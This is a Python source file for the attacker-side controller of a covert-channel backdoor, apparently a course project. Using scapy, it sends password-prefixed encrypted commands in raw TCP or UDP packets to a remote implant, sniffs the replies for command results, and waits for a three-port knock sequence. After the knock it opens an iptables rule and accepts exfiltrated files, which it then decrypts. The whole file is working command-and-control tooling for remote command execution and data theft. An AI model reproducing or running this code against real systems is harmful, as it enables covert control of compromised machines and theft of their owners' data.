#!/usr/bin/python3
import time, os, sys, logging
import threading
from scapy.all import *
import netifaces
import encryption
import helpers
import iptablesManager

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
CHUNK_SIZE = 16
BUFSIZE = 1024

"""
Design for covert channel
password stored in ip_option field
type of response stored in tcp reserved field
result stored in tcp payload
"""

class Attacker(object):

    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList, ttl):
        self.localIP = lhost
        self.localPort = int(lport)
        self.listenPort = int(lisport)
        self.remoteIP = rhost
        self.remotePort = int(rport)
        self.protocol = proto.upper()

        self.password = password

        self.knockList = []
        for port in kList.split(','):
            self.knockList.append(int(port))

        self.ttl = int(ttl)
        self.state = 0

    def run(self):
        helpers.checkRootPrivilege()

        send_command_thread = threading.Thread(target=self.sendCommand)
        send_command_thread.setDaemon(True)
        send_command_thread.start()

        listen_thread = threading.Thread(target=self.listen)
        listen_thread.setDaemon(True)
        listen_thread.start()

        knock_listener_thread = threading.Thread(target=self.knockListener)
        knock_listener_thread.setDaemon(True)
        knock_listener_thread.start()

        try:
            while threading.active_count() > 0:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print('Attacker closed...\n')
            sys.exit(0)

    def sendCommand(self):
        while True:
            cmd = raw_input()
            sys.stdout.flush()
            payload = encryption.encrypt(self.password + cmd)
            if self.protocol == 'TCP':
                packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
            elif self.protocol == 'UDP':
                packet = IP(dst=self.remoteIP, src=self.localIP)/UDP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)

            send(packet, verbose=False)

            if cmd == 'CLOSE':
                print("Attacker closed...\n")
                os._exit(0)

    """
    Listen for incoming knock
    """

    def knockListener(self):
        mFilter = "udp and src host " + self.remoteIP + " and src port " + str(self.remotePort)
        while True:
            sniff(filter=mFilter, prn=self.knockReceive, count=1)

    def knockReceive(self, packet):
        if packet.haslayer(UDP):
            port = packet[UDP].dport
            if port == self.knockList[0] and self.state == 0:
                self.state = 1
            elif port == self.knockList[1] and self.state == 1:
                self.state = 2
            elif port == self.knockList[2] and self.state == 2:
                self.state = 3
                print("Knocking successfully...Openning port for receiving")
                self.acceptRequest()
                self.state = 0
            else:
                self.state = 0

    def acceptRequest(self):
        iptablesManager.run(self.protocol, self.remoteIP, str(self.listenPort), self.ttl)

        sock = helpers.createSocket()
        port = self.listenPort
        sock.bind((self.localIP, port))

        sock.listen(1)
        print("Ready to receive on port %d..." % port)
        conn, addr = sock.accept()
        print("Receive connection from {}".format(addr))

        dummyFile = "received_data.txt"
        with open(dummyFile, 'wb') as receivedData:
            while True:
                data = conn.recv(BUFSIZE)

                if data.endswith(b"EOF"):
                    data = data[:-3]
                    receivedData.write(data)
                    break
                receivedData.write(data)

        conn.close()
        encryption.decryptFile(dummyFile)
        os.remove(dummyFile)
        print("Done receiving!")


    def listen(self):
        mFilter = self.protocol.lower() + " src port " + str(self.remotePort) + " and dst port " + \
                str(self.localPort) + " and src host " + self.remoteIP
        print("Filter: %s" % mFilter)
        sniff(lfilter=self.isIncoming, filter=mFilter, prn=self.parsePacket)

    def parsePacket(self, packet):
        """
        """
        payload = packet[self.protocol].payload.load
        data = encryption.decrypt(payload)

        if data == "":
            return
        password = data[:8]
        result = data[8:]

        if password not in self.password:
            return
        else:
            print("Result:\n%s" % result)

    def isIncoming(self, packet):
        """
        Check if packets are incoming or outgoing.
        """
        # Get the default hardware interface
        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
        return packet[Ether].src != hardwareAddr
